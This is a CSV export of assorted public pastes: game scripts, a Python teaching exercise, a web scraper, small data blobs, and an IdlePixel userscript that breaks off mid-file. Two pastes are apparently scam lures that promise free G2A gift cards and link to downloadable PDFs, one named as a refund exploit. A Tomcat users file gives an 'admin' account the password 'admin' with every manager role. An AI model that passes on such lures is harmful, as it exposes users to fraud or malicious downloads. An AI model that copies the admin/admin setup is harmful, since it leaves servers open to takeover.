id,title,username,language,date,content
6D4juan3,Review INFINOX,reviewbrokers,PHP,Monday 8th of April 2024 07:05:31 AM CDT,https://www.reviewbrokers.net/review-infinox/
KY8JRemv,Untitled,omarhurani,JSON,Monday 8th of April 2024 07:03:51 AM CDT,"{
	""result"": true
}"
RJHRNgTS,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,ssss50w,GetText,Monday 8th of April 2024 06:42:26 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
08 April 2024
"
e0Zeyfwg,ü§ë G2A.com Free Gift Card Guide Apr 2024 FIX ü§ë,jusst2k4,GetText,Monday 8th of April 2024 06:38:36 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_916364.pdf

Working as of:
08 April 2024"
AnbziF34,Untitled,ovichan,XML,Monday 8th of April 2024 06:11:31 AM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the ""License""); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an ""AS IS"" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns=""http://tomcat.apache.org/xml""
              xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
              xsi:schemaLocation=""http://tomcat.apache.org/xml tomcat-users.xsd""
              version=""1.0"">
<!--
  By default, no user is included in the ""manager-gui"" role required
  to operate the ""/manager/html"" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary.

  Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->
<!--
  <user username=""admin"" password=""<must-be-changed>"" roles=""manager-gui""/>
  <user username=""robot"" password=""<must-be-changed>"" roles=""manager-script""/>
-->
<!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename=""tomcat""/>
  <role rolename=""role1""/>
  <user username=""tomcat"" password=""<must-be-changed>"" roles=""tomcat""/>
  <user username=""both"" password=""<must-be-changed>"" roles=""tomcat,role1""/>
  <user username=""role1"" password=""<must-be-changed>"" roles=""role1""/>
-->

	<role rolename=""manager-gui""/>
	<role rolename=""manager-script""/>
	<role rolename=""manager-jmx""/>
	<role rolename=""manager-status""/>
	<role rolename=""admin-gui""/>
	<role rolename=""admin-script""/>
	<role rolename=""admin""/>
	<user username=""admin"" password=""admin"" roles=""manager-gui,manager-script,manager-jmx,manager-status,admin,admin-gui,admin-script""/>
</tomcat-users>"
71hGXJwN,data890,TestGuy1,JSON,Monday 8th of April 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '8918b09af0e9a49bbe185e9ced9e422684c03b098a723204f82ae76f65959f0c155b2d03d4accfc46759cdb714476a864b919d85b42b19021b217082503eee8970ea8bcb1524170d6b730aef7a0d81529b0899e95b9ae8a07a8790cc974eacb883fbc0d2a0c49e813fbb522dff58aed56c929127612d1cb8963a043d9b6f48c2',
  otherdata: [
    '6beb311116535c3d51a493021552958a',
    '94c3d2bd6fc103afd72315cbbf47f044',
    'e7ad2bcc9582f1aab8bc0266380c88ad',
    '481b1b23e89ecef9dd8b3ea8dde9c24e',
    'b45c61d1d3acb3e35eb812bba035564c',
    '863ab38e435541e59ed40dbf7a234e8d',
    '40ee1a8e7eace904a5ea7b89c4f2e33b',
    '4f5ebe7e92367302c39501dd6c4942b5'
  ]
}"
xtMz3vbr,Untitled,asseater64,GDScript,Monday 8th of April 2024 05:56:26 AM CDT,"extends CharacterBody3D

@onready var camera_mount = $camera_mount
@onready var animation_player = $visual/RoundChar/AnimationPlayer
@onready var visual = $visual

const JUMP_VELOCITY = 4.5

@export var SPEED = 5.0
@export var sens_horizontal = 0.2
@export var sens_vertical = 0.2

# Get the gravity from the project settings to be synced with RigidBody nodes.
var gravity = ProjectSettings.get_setting(""physics/3d/default_gravity"")

func _ready():
	Input.mouse_mode = Input.MOUSE_MODE_CAPTURED
	animation_player.speed_scale = 2


func _input(event):
	if event is InputEventMouseMotion:
		var yToRotate = event.relative.x * sens_horizontal
		rotate_y(deg_to_rad(-yToRotate))
		visual.rotate_y(deg_to_rad(yToRotate))
		camera_mount.rotate_x(deg_to_rad(-event.relative.y * sens_vertical))


func _physics_process(delta):
	# Add the gravity.
	if not is_on_floor():
		velocity.y -= gravity * delta

	# Handle jump.
	if Input.is_action_just_pressed(""ui_accept"") and is_on_floor():
		velocity.y = JUMP_VELOCITY

	# Get the input direction and handle the movement/deceleration.
	# As good practice, you should replace UI actions with custom gameplay actions.
	var input_dir = Input.get_vector(""left"", ""right"", ""forward"", ""backward"")
	var direction = (transform.basis * Vector3(input_dir.x, 0, input_dir.y)).normalized()
	if direction:
		play_anim(""Run"")
		visual.look_at(position + direction)
		velocity.x = direction.x * SPEED
		velocity.z = direction.z * SPEED
	else:
		play_anim(""Idle"")
		velocity.x = move_toward(velocity.x, 0, SPEED)
		velocity.z = move_toward(velocity.z, 0, SPEED)

	move_and_slide()


func play_anim(anim_name: String):
	if (animation_player.current_animation != anim_name):
		animation_player.play(anim_name)
"
YP2UJ1H6,Untitled,Skalefou,Python,Monday 8th of April 2024 05:52:10 AM CDT,"# Ceci est un commentaire, il est pr√©c√©d√© par un '#' et cela permet d'√©crire un texte sans qu'il soit lu par python, ce qui est pratique pour expliquer son code
from random import * # Ajoute dans le programme l'ensemble des fonctions de la biblioth√®que ""random"", une biblioth√®que est un regroupement de fonction d√©j√† √©crite

def Ecart(): # D√©finis une fonction (exactement comme en math√©matique) permettant de factoriser du code, j'aurais juste √† appeler ""Ecart()"" pour executer l'algorithme ci-dessous
	k=0 # D√©finis une variable 'k' √† 0, on pourrait d√©finir une variable comme une case o√π on peut stocker le nombre qu'on veut et le r√©cup√©rer √† tout moment et le changer, donc ici, on stocke '0' dans 'k'
	for i in range(100): # Ceci est une boucle qui va r√©p√©ter un bout de code en l'occurence tout ce qui est en dessous de lui et qui a un espace. i est le nombre d'occurence et il va r√©p√©ter 100 fois le code
		if random()<=0.1: # On utilise random() de la biblioth√®que 'random' cette fonction renvoie un nombre d√©cimal al√©atoire entre 0 et 1 puis on execute le code en dessous o√π il ya un espace si c'est √©gal ou 			inf√©rieur √† 0.1
			k=k+1 # Si le nombre renvoy√© par random() est inf√©rieur √† 0.1 alors on additionne la valeur de k de 1. Comme il n'y a pas d'espace en dessous de cette ligne, on termine la boucle et la condition
	f=k/100 #¬†D√©finis une variable 'f' et on l'attribue en valeur la valeur de k divis√© par 100
	e=abs(f-0.1) # On utilise la fonction absolue qui fait le calcul f - 0.1 (comme en math√©matique) qu'on attribue dans la variable 'e' 
	e=round(e,3) # On arrondis au milli√®me la valeur de e
	return e # On retourne e, c'est-√†-dire que notre fonction ecart donnera √† l'utilisateur cette valeur suite √† l'execution de la fonction
	
for i in range(40): # On r√©p√®te 40 fois le code ci-dessous
	print(Ecart()) # On affiche la valeur renvoy√© par la fonction Ecart(), donc on execute 40 fois Ecart"
QYfRtWuU,Untitled,menika,Python,Monday 8th of April 2024 05:44:33 AM CDT,"from bs4 import BeautifulSoup as bs
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from fake_useragent import UserAgent



ua = UserAgent()

base_url = ""https://www.kinopoisk.ru""
headers = {""Accept"": ""text/html"", 'User-Agent': ua.random}


qwe = '–ñ–µ–º—á—É–∂–Ω–∞—è –¥–µ–≤—É—à–∫–∞'

options = webdriver.ChromeOptions()
options.add_argument(""--headless"")
browser = webdriver.Chrome(options=options)
browser.get(base_url)
browser.find_element(by=By.XPATH, value='//*[@id=""__next""]/div[1]/div[1]/header/div/div[2]/div[2]/div/form/div/input').send_keys(qwe, Keys.ENTER)
browser.find_element(by=By.LINK_TEXT, value=qwe).click()
html_sourse = browser.page_source

soup = bs(html_sourse, 'lxml')
asd = soup.find_all('div', class_='styles_valueDark__BCk93 styles_value__g6yP4')
rate = soup.find('div', class_='styles_valueBlock___nWKb')
print(rate.get_text())
print(asd[2].get_text())
print(asd[4].get_text())
print(asd[6].get_text())"
V9pgMHRW,FasterCanConvertMethod,pszczyg,C#,Monday 8th of April 2024 05:43:59 AM CDT," static HashSet<Type> _classesConvertable = new HashSet<Type>();
 static HashSet<Type> _classesNonConvertable = new HashSet<Type>();

 public override bool CanConvert(Type objectType)
 {
     if (_classesConvertable.Contains(objectType)) return true;
     if(_classesNonConvertable.Contains(objectType)) return false;
     
     if (typeof(IContainSecretData).IsAssignableFrom(objectType))
     {
         _classesConvertable.Add(objectType);
         return true;
     }
     else
     {
         _classesNonConvertable.Add(objectType);
         return false;
     }
 }"
gg3FGj60,Untitled,Lux-Ferre,JavaScript,Monday 8th of April 2024 05:39:50 AM CDT,"// ==UserScript==
// @name         IdlePixel UI Tweaks - GodofNades Fork
// @namespace    com.anwinity.idlepixel
// @version      2.8.22
// @description  Adds some options to change details about the IdlePixel user interface.
// @author       Original Author: Anwinity || Modded By: GodofNades
// @license      MIT
// @match        *://idle-pixel.com/login/play/
// @grant        none
// @require      https://greasyfork.org/scripts/441206-idlepixel/code/IdlePixel+.js?anticache=20220905
// @downloadURL https://update.greasyfork.org/scripts/459147/IdlePixel%20UI%20Tweaks%20-%20GodofNades%20Fork.user.js
// @updateURL https://update.greasyfork.org/scripts/459147/IdlePixel%20UI%20Tweaks%20-%20GodofNades%20Fork.meta.js
// ==/UserScript==

(function () {
    ""use strict"";

    let IPP, getVar, getThis, purpleKeyGo, utcDate, currUTCDate;

    window.UIT_IMAGE_URL_BASE =
        document
            .querySelector(""itembox[data-item=copper] img"")
            .src.replace(/\/[^/]+.png$/, """") + ""/"";

    // Start New Base Code Re-work
    const uitLevel = function () {
        window.uitSkills = [
            ""mining"",
            ""crafting"",
            ""gathering"",
            ""farming"",
            ""brewing"",
            ""woodcutting"",
            ""cooking"",
            ""fishing"",
            ""invention"",
            ""melee"",
            ""archery"",
            ""magic"",
        ];

        return {
            LEVELS: function () {
                let result = [];
                result[1] = 0;
                for (let lv = 2; lv <= 300; lv++) {
                    result[lv] = Math.ceil(Math.pow(lv, 3 + lv / 200));
                }
                return result;
            },

            xpToLevel: function (xp) {
                if (xp <= 0) {
                    return 1;
                }
                if (xp >= uitLevel().LEVELS()[300]) {
                    return 300;
                }
                let lower = 1;
                let upper = 300;
                while (lower <= upper) {
                    let mid = Math.floor((lower + upper) / 2);
                    let midXP = uitLevel().LEVELS()[mid];
                    let midPlus1XP = uitLevel().LEVELS()[mid + 1];
                    if (xp < midXP) {
                        upper = mid;
                        continue;
                    }
                    if (xp > midPlus1XP) {
                        lower = mid + 1;
                        continue;
                    }
                    if (mid < 100 && xp == uitLevel().LEVELS()[mid + 1]) {
                        return mid + 1;
                    }
                    return mid;
                }
            },

            extendedLevelsUpdate: function () {
                let overallLevel = 0;

                uitSkills.forEach((skill) => {
                    const xp = getVar(`${skill}_xp`, 0, ""int"");
                    const level = uitLevel().calculateExtendedLevel(xp);
                    uitLevel().updateExtendedLevel(skill, level);
                    overallLevel += level;
                });

                uitLevel().updateOverallLevel(overallLevel);

                uitLevel().hideOriginalLevels();
            },

            calculateExtendedLevel: function (xp) {
                let extendedLevel = 0;
                while (Math.pow(extendedLevel, 3 + extendedLevel / 200) < xp) {
                    extendedLevel++;
                }
                if (extendedLevel == 0) {
                    return 1;
                }
                return extendedLevel - 1;
            },

            updateExtendedLevel: function (skill, extendedLevel) {
                const skillElement = document.querySelector(
                    `#overallLevelExtended-${skill}`
                );
                const colorStyle = extendedLevel >= 100 ? ""color:cyan"" : """";
                skillElement.textContent = `(LEVEL ${Math.max(extendedLevel, 1)})`;
                skillElement.setAttribute(""style"", colorStyle);
            },

            updateOverallLevel: function (overallLevel) {
                const totalElement = document.querySelector(
                    ""#overallLevelExtended-total""
                );
                if (overallLevel >= 100) {
                    totalElement.textContent = ` (${overallLevel})`;
                    totalElement.style.color = ""cyan"";
                } else {
                    totalElement.textContent = """";
                    totalElement.style.display = ""none"";
                }
            },

            hideOriginalLevels: function () {
                uitSkills.forEach((skill) => {
                    const skillElement = document.querySelector(
                        `#menu-bar-${skill}-level`
                    );
                    if (skillElement) {
                        skillElement.style.display = ""none"";
                    }
                });
            },

            addLoadingSpanAfterElement: function (selector, id) {
                const element = document.querySelector(selector);
                const loadingSpan = document.createElement(""span"");
                loadingSpan.id = id;
                loadingSpan.textContent = ""(Loading)"";
                loadingSpan.className = ""color-silver"";
                element.insertAdjacentElement(""afterend"", loadingSpan);
            },

            initExtendedLevels: function () {
                if (
                    document.querySelector("".game-top-bar-upper > a:nth-child(4) > item-display"")
                ) {
                    uitLevel().addLoadingSpanAfterElement(
                        "".game-top-bar-upper > a:nth-child(4) > item-display"",
                        ""overallLevelExtended-total""
                    );
                } else {
                    uitLevel().addLoadingSpanAfterElement(
                        "".game-top-bar-upper > a:nth-child(5) > item-display"",
                        ""overallLevelExtended-total""
                    );
                }
                uitSkills.forEach((skill) => {
                    uitLevel().addLoadingSpanAfterElement(
                        `#menu-bar-${skill}-level`,
                        `overallLevelExtended-${skill}`
                    );
                });
            },

            initNextLevel: function () {
                const itemDisplayElements = document.querySelectorAll(""item-display"");

                itemDisplayElements.forEach((el) => {
                    const dataKey = el.getAttribute(""data-key"");
                    if (dataKey && dataKey.endsWith(""_xp"")) {
                        const parent = el.parentElement;
                        const uiTweaksXpNext = document.createElement(""span"");
                        uiTweaksXpNext.className = ""ui-tweaks-xp-next"";
                        uiTweaksXpNext.innerHTML = ""&nbsp;&nbsp;Next Level: "";
                        const itemDisplayNext = document.createElement(""item-display"");
                        itemDisplayNext.setAttribute(""data-format"", ""number"");
                        itemDisplayNext.setAttribute(""data-key"", `ipp_${dataKey}_next`);
                        uiTweaksXpNext.appendChild(itemDisplayNext);
                        parent.appendChild(uiTweaksXpNext);
                    }
                });
            },
        };
    };

    const uitPurpleKey = function () {
        // No global constants/declarations
        return {
            onPurpleKey: function (monster, rarity, timer) {
                if (purpleKeyGo) {
                    const timeLeft = format_time(timer);
                    const imageSrc = monster;
                    const monsterName = imageSrc
                        .replace(/_/g, "" "")
                        .replace(/\b\w/g, (letter) => letter.toUpperCase());

                    const purpleKeyNotification = document.querySelector(
                        ""#notification-purple_key""
                    );
                    const imageElement = document.querySelector(
                        ""#notification-purple_key-image""
                    );
                    const imageTextElement = document.querySelector(
                        ""#notification-purple_key-image-text""
                    );
                    const rarityElement = document.querySelector(
                        ""#notification-purple_key-rarity""
                    );
                    const timeElement = document.querySelector(
                        ""#notification-purple_key-time""
                    );

                    imageElement.setAttribute(
                        ""src"",
                        `https://d1xsc8x7nc5q8t.cloudfront.net/images/${imageSrc}_icon.png`
                    );
                    imageTextElement.innerText = `${monsterName} `;
                    rarityElement.innerText = ` ${rarity}`;
                    timeElement.innerText = ` ‚è≤Ô∏è${timeLeft}`;

                    if (rarity === ""Very Rare"") {
                        purpleKeyNotification.style.backgroundColor = ""DarkRed"";
                        [imageTextElement, rarityElement, timeElement].forEach(
                            (element) => (element.style.color = ""white"")
                        );
                    } else {
                        let textColor = ""black"";
                        if (rarity === ""Rare"") {
                            purpleKeyNotification.style.backgroundColor = ""orange"";
                        } else if (rarity === ""Uncommon"") {
                            purpleKeyNotification.style.backgroundColor = ""gold"";
                        } else if (rarity === ""Common"") {
                            purpleKeyNotification.style.backgroundColor = ""DarkGreen"";
                            textColor = ""white"";
                        }
                        [imageTextElement, rarityElement, timeElement].forEach(
                            (element) => (element.style.color = textColor)
                        );
                    }
                    return;
                }
            },

            addPurpleKeyNotifications: function () {
                var purpleKeyUnlocked = getVar(""guardian_purple_key_hint"", 0, ""int"");
                const notifDiv = document.createElement(""div"");
                notifDiv.id = `notification-purple_key`;
                notifDiv.onclick = function () {
                    websocket.send(""CASTLE_MISC=guardian_purple_key_hint"");
                };
                notifDiv.className = ""notification hover"";
                notifDiv.style = ""margin-right: 4px; margin-bottom: 4px; display: none"";
                notifDiv.style.display = ""inline-block"";

                var elem = document.createElement(""img"");
                elem.setAttribute(""src"", """");
                const notifIcon = elem;
                notifIcon.className = ""w20"";
                notifIcon.id = `notification-purple_key-image`;
                notifIcon.innerText = """";

                const notifDivImgText = document.createElement(""span"");
                notifDivImgText.id = `notification-purple_key-image-text`;
                notifDivImgText.innerText = """";
                notifDivImgText.className = ""color-white"";

                var elemKey = document.createElement(""img"");
                elemKey.setAttribute(
                    ""src"",
                    `${UIT_IMAGE_URL_BASE}purple_gaurdian_key.png`
                );
                const notifDivRarityKey = elemKey;
                notifDivRarityKey.className = ""w20"";
                notifDivRarityKey.id = `notification-purple_key-rarity-img`;
                notifDivRarityKey.style = `transform: rotate(-45deg)`;

                const notifDivRarity = document.createElement(""span"");
                notifDivRarity.id = `notification-purple_key-rarity`;
                notifDivRarity.innerText = ""Purple Key Info Loading"";
                notifDivRarity.className = ""color-white"";

                const notifDivTime = document.createElement(""span"");
                notifDivTime.id = `notification-purple_key-time`;
                notifDivTime.innerText = """";
                notifDivTime.className = ""color-white"";

                notifDiv.append(
                    notifIcon,
                    notifDivImgText,
                    notifDivRarityKey,
                    notifDivRarity,
                    notifDivTime
                );
                document.querySelector(""#notifications-area"").prepend(notifDiv);
                if (purpleKeyUnlocked == 0) {
                    document.querySelector(""#notification-purple_key"").style.display =
                        ""none"";
                } else {
                    document.querySelector(""#notification-purple_key"").style.display =
                        ""inline-block"";
                }
            },
        };
    };

    const uitCriptoe = function () {
        // No global constants/declarations
        return {
            addCriptoeValues: function () {
                fetch('https://idle-pixel.com/criptoe/')
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        return response.json();
                    })
                    .then(data => {
                        let walletPercentages = {};
                        let seenWallets = new Set();

                        const dataArray = data.data;

                        for (let i = dataArray.length - 1; i >= 0; i--) {
                            let entry = dataArray[i];
                            if (!seenWallets.has(entry.wallet)) {
                                seenWallets.add(entry.wallet);
                                walletPercentages[`wallet_${entry.wallet}`] = entry.percentage;
                            }

                            if (seenWallets.size === 4) break;
                        }

                        const wallets = [""wallet_1"", ""wallet_2"", ""wallet_3"", ""wallet_4""];

                        wallets.forEach((walletKey) => {
                            const payoutElementId = `${walletKey}_payout`;
                            const payoutElement = document.getElementById(payoutElementId);
                            let percentage = walletPercentages[walletKey];
                            const investedAmount = getVar(`${walletKey.replace(""_"", """")}_invested`, 0, ""int"");
                            if (investedAmount > 0) {
                                if (percentage > -100) {
                                    payoutElement.innerText = ` ${uitCriptoe().getPayout(investedAmount, percentage)}`;
                                } else {
                                    payoutElement.innerText = ` Full Loss`;
                                }
                            } else {
                                payoutElement.innerText = ` No Investment`;
                            }
                            const percentageElementId = `criptoe-${walletKey.replace(""_"", ""-"")}-percentage`;
                            const percentageElement = document.getElementById(percentageElementId);

                            let percentageText = """";
                            let weekday = new Date().getUTCDay();
                            if (weekday == 0) {
                                percentage = -20;
                                percentageText = `${percentage} %`;
                            } else if (weekday == 1) {
                                percentage = 0;
                                percentageText = `Go invest!`;

                            } else {
                                percentageText = `${percentage} %`;
                            }

                            percentageElement.innerText = `${percentageText}`;

                            if (percentage < 0) {
                                percentageElement.style.color = ""red"";
                            } else if (percentage > 0) {
                                percentageElement.style.color = ""lime"";
                            } else {
                                percentageElement.style.color = ""white"";
                            }
                        });
                    })
                    .catch(error => {
                        console.error('There has been a problem with your fetch operation:', error);
                    });
            },

            initCriptoe: function () {
                document
                    .querySelector(
                        ""#panel-criptoe-market > div.charts-content > div > table:nth-child(1) > tbody > tr > td:nth-child(1) > item-display""
                    )
                    .insertAdjacentHTML(
                        ""afterend"",
                        `<br><b>Current Payout: </b><span id=""wallet_1_payout""></span>`
                    );
                document
                    .querySelector(
                        ""#panel-criptoe-market > div.charts-content > div > table:nth-child(3) > tbody > tr > td:nth-child(1) > item-display""
                    )
                    .insertAdjacentHTML(
                        ""afterend"",
                        `<br><b>Current Payout: </b><span id=""wallet_2_payout""></span>`
                    );
                document
                    .querySelector(
                        ""#panel-criptoe-market > div.charts-content > div > table:nth-child(5) > tbody > tr > td:nth-child(1) > item-display""
                    )
                    .insertAdjacentHTML(
                        ""afterend"",
                        `<br><b>Current Payout: </b><span id=""wallet_3_payout""></span>`
                    );
                document
                    .querySelector(
                        ""#panel-criptoe-market > div.charts-content > div > table:nth-child(7) > tbody > tr > td:nth-child(1) > item-display""
                    )
                    .insertAdjacentHTML(
                        ""afterend"",
                        `<br><b>Current Payout: </b><span id=""wallet_4_payout""></span>`
                    );

                document.getElementById(""left-panel-item_panel-criptoe-market"").onclick =
                    function () {
                        switch_panels('panel-criptoe-market');
                        uitCriptoe().addCriptoeValues();
                    }
            },

            getPayout: function (wallet, perct) {
                let weekday = new Date().getUTCDay();
                let payout;
                if (weekday == ""0"") {
                    payout = Math.floor(
                        wallet * 0.8
                    )
                    return payout;
                }
                if (weekday == ""1"") {
                    return 0;
                }
                payout = Math.floor(
                    wallet * (perct / 100 + 1)
                ).toLocaleString();
                return payout;
            },
        };
    };

    const uitTableLabels = function () {
        window.UIT_POTION_XP_MAP = {
            stardust_potion: 75,
            energy_potion: 50,
            anti_disease_potion: 250,
            tree_speed_potion: 525,
            smelting_upgrade_potion: 550,
            great_stardust_potion: 1925,
            farming_speed_potion: 500,
            rare_monster_potion: 2125,
            super_stardust_potion: 4400,
            gathering_unique_potion: 3000,
            heat_potion: 2500,
            bait_potion: 1000,
            bone_potion: 1550,
            furnace_speed_potion: 6000,
            promethium_potion: 2000,
            oil_potion: 5000,
            super_rare_monster_potion: 6000,
            ultra_stardust_potion: 12900,
            magic_shiny_crystal_ball_potion: 7000,
            birdhouse_potion: 800,
            rocket_potion: 1500,
            titanium_potion: 5000,
            blue_orb_potion: 50000,
            geode_potion: 9500,
            magic_crystal_ball_potion: 12000,
            stone_converter_potion: 4000,
            rain_potion: 2500,
            combat_loot_potion: 9500,
            rotten_potion: 1250,
            merchant_speed_potion: 50000,
            green_orb_potion: 200000,
            guardian_key_potion: 42500,
            ancient_potion: 40000,
            red_orb_potion: 500000,
            cooks_dust_potion: 100000,
            farm_dust_potion: 100000,
            fighting_dust_potion: 100000,
            tree_dust_potion: 100000,
            infinite_oil_potion: 0,
            raids_hp_potion: 0,
            raids_mana_potion: 0,
            raids_bomb_potion: 0,
        };

        return {
            addTableCraftLabels: function () {
                // Invention Table
                const inventionTableRows = document.querySelectorAll(
                    ""#invention-table tbody tr[data-tablette-required]""
                );
                inventionTableRows.forEach((row) => {
                    const outputs = row.querySelectorAll(
                        ""td:nth-child(4) item-invention-table""
                    );
                    outputs.forEach((output) => {
                        output.textContent =
                            Number(output.textContent).toLocaleString() +
                            "" ("" +
                            output.getAttribute(""data-materials-item"").replaceAll(""_"", "" "") +
                            "")"";
                    });
                });

                // Crafting Table
                const craftingTableRows = document.querySelectorAll(
                    ""#crafting-table tbody tr[data-crafting-item]""
                );
                craftingTableRows.forEach((row) => {
                    const outputs = row.querySelectorAll(
                        ""td:nth-child(3) item-crafting-table""
                    );
                    outputs.forEach((output) => {
                        output.textContent =
                            Number(output.textContent).toLocaleString() +
                            "" ("" +
                            output.getAttribute(""data-materials-item"").replaceAll(""_"", "" "") +
                            "")"";
                    });
                });

                // Brewing Table
                const brewingTableRows = document.querySelectorAll(
                    ""#brewing-table tbody tr[data-brewing-item]""
                );
                brewingTableRows.forEach((row) => {
                    const outputs = row.querySelectorAll(
                        ""td:nth-child(3) item-brewing-table""
                    );
                    outputs.forEach((output) => {
                        output.textContent =
                            output.textContent +
                            "" ("" +
                            output.getAttribute(""data-materials-item"").replaceAll(""_"", "" "") +
                            "")"";
                    });
                });
            },

            updateTableCraftLabels: function () {
                const brewingTable = document.querySelector(""#brewing-table"");
                if (brewingTable) {
                    const rows = brewingTable.querySelectorAll(
                        ""tbody tr[data-brewing-item]""
                    );
                    rows.forEach((row) => {
                        if (row.id != ""id-raids_hp_potion"" || row.id != ""id-raids_mana_potion"" || row.id != ""id-raids_bomb_potion"") {
                            const brewingXP = row.querySelector(""td:nth-child(6)"");
                            if (brewingXP) {
                                const potionName = brewingXP.id.replace(""_xp"", """");
                                const potionXP =
                                    UIT_POTION_XP_MAP[potionName].toLocaleString() + "" xp"";
                                const potionOrig = document.createElement(""span"");
                                potionOrig.classList.add(""font-small"", ""color-grey"");
                                potionOrig.textContent = potionXP;
                                brewingXP.innerHTML = """";
                                brewingXP.appendChild(potionOrig);
                            }
                        }
                    });
                }
            },

            disableTableRefreshBrewing: function () {
                Brewing.refresh_table = function () {
                    Brewing._refresh_click_events();
                    Brewing._refresh_materials();
                    Brewing._refresh_timers();
                    Brewing._refresh_backgrounds();
                    //Brewing._refresh_xp_labels();
                }
            },

            Crafting_getMaterials: function () {
                Crafting._refresh_materials_and_level = function () {
                    var crafting_table = document.getElementById(""crafting-table"");
                    var materials_req_array = crafting_table.getElementsByTagName(""item-crafting-table"");
                    var levels_req_array = crafting_table.getElementsByTagName(""item-crafting-table-level"");

                    for (var i = 0; i < materials_req_array.length; i++) {
                        var materials_req = materials_req_array[i];
                        var item = materials_req.getAttribute(""data-materials-item"");
                        var originalAmount = materials_req.innerHTML;
                        var amountText = originalAmount.split("" "")[0];
                        var cleanedAmountText = amountText.replace(/[,.\s]/g, '');
                        var amount = parseInt(cleanedAmountText, 10);

                        if (Items.getItem(item) >= amount)
                            materials_req_array[i].style.color = ""#00a200"";
                        else
                            materials_req_array[i].style.color = ""red"";
                    }

                    for (var ix = 0; ix < levels_req_array.length; ix++) {
                        var levels_req = levels_req_array[ix];
                        var level_found = parseInt(levels_req.innerHTML);
                        if (get_level(Items.getItem(""crafting_xp"")) >= level_found)
                            levels_req.style.color = ""green"";
                        else
                            levels_req.style.color = ""red"";
                    }
                }
                Crafting._refresh_click_events()
                {
                    if (!Crafting._click_events_loaded) {
                        var crafting_table = document.getElementById(""crafting-table"");
                        var crafting_row_array = crafting_table.getElementsByTagName(""tr"");

                        for (var i = 0; i < crafting_row_array.length; i++) {
                            var crafting_row = crafting_row_array[i];
                            if (!crafting_row.hasAttribute(""data-crafting-item""))
                                continue;

                            crafting_row.addEventListener('click', (e) => {
                                var target_clicked = e.target;
                                var tr = target_clicked.closest(""tr"");
                                var crafting_row_item = tr.getAttribute(""data-crafting-item"");
                                var can_use_crafting_input_multiple = tr.getAttribute(""data-crafting-item-multiple"") === ""true"";

                                if (can_use_crafting_input_multiple)
                                    Modals.open_input_dialogue(crafting_row_item, ""Crafting"", ""How many do you want to craft?"", ""CRAFT"");
                                else {
                                    var materials = Crafting.get_materials(crafting_row_item);
                                    var html = ""<div class='modal-crafting-ingredients shadow'>"";
                                    html += ""<b>MATERIALS</b><hr />"";
                                    for (var i = 0; i < materials.length; i++) {
                                        var name = materials[i];
                                        i++;
                                        var amount = materials[i];
                                        var originalAmount = materials[i];
                                        console.log(originalAmount);
                                        var amountText = originalAmount.split("" "")[0];
                                        var cleanedAmountText = amountText.replace(/[,.\s]/g, '');
                                        var amountClick = parseInt(cleanedAmountText, 10);

                                        var img = '<img width=""15px"" height=""15px"" src=""https://d1xsc8x7nc5q8t.cloudfront.net/images/x.png"">';

                                        if (Items.getItem(name) >= amountClick)
                                            img = '<img width=""15px"" height=""15px"" src=""https://d1xsc8x7nc5q8t.cloudfront.net/images/check.png"">';

                                        html += ""<img class='w40' src='https://d1xsc8x7nc5q8t.cloudfront.net/images/"" + name + "".png' /> "" + originalAmount + "" "" + img;
                                        html += ""<br />"";
                                    }
                                    html += ""</div><br /><br />Craft Item?"";

                                    document.getElementById(""modal-brew-ingredients"").innerHTML = html;
                                    Modals.open_image_modal(""Crafting"", ""images/"" + crafting_row_item + "".png"", html, ""Craft"", ""Cancel"", ""CRAFT="" + crafting_row_item + ""~"" + 1)
                                }

                            });
                        }
                        Crafting._click_events_loaded = true;
                    }

                }
            },

            Invention_getMaterials: function () {
                Invention._refresh_materials = function () {
                    var invention_table = document.getElementById(""invention-table"");
                    var materials_req_array = invention_table.getElementsByTagName(""item-invention-table"");

                    for (var i = 0; i < materials_req_array.length; i++) {
                        var materials_req = materials_req_array[i];
                        var item = materials_req.getAttribute(""data-materials-item"");
                        var originalAmount = materials_req.innerHTML;
                        var amountText = originalAmount.split("" "")[0];
                        var cleanedAmountText = amountText.replace(/[,.\s]/g, '');
                        var amount = parseInt(cleanedAmountText, 10);

                        if (Items.getItem(item) >= amount)
                            materials_req_array[i].style.color = ""#00a200"";
                        else
                            materials_req_array[i].style.color = ""red"";
                    }
                }
            },
        };
    };

    const uitFishing = function () {
